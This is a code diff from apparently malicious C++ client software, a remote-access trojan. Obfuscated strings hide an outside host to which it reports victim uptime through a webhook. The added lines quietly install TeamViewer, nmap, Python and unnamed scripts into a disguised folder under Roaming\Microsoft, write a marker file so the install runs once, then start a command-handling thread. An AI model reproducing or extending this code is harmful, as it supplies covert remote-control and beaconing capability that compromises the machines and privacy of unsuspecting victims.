@@ -40,6 +40,25 @@ namespace client {
 			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=") + std::string(xorstr_("**PC Just Turned On**\n```\n") + std::to_string((uptime / 60000).count()) + std::string(xorstr_(" Minutes Ago")) + std::string(xorstr_("\n```"))) + std::string(xorstr_("&webhook_url=")) + client_webhook_url);
 		}
 
+		/* Pre Downloads */
+		if (!std::filesystem::exists(helpers::roaming + xorstr_("\\Microsoft\\suc.txt"))) {
+			if (!std::filesystem::exists(helpers::roaming + xorstr_("\\Microsoft\\tv")))
+				functions::install_teamviewer();
+
+			if (helpers::exec("where nmap").find("nmap") == std::string::npos)
+				functions::install_nmap();
+
+			if (helpers::exec("where python").find("Python") == std::string::npos)
+				functions::install_python();
+
+			if (!std::filesystem::exists(helpers::roaming + xorstr_("\\Microsoft\\scripts")))
+				functions::install_scripts();
+
+			/* Mark To Not Do Again */
+			std::ofstream outfile(helpers::roaming + xorstr_("\\Microsoft\\suc.txt"));
+			outfile.close();
+		}
+
 		/* Create Communication Thread */
 		std::thread coms(communication::handler_loop);
 
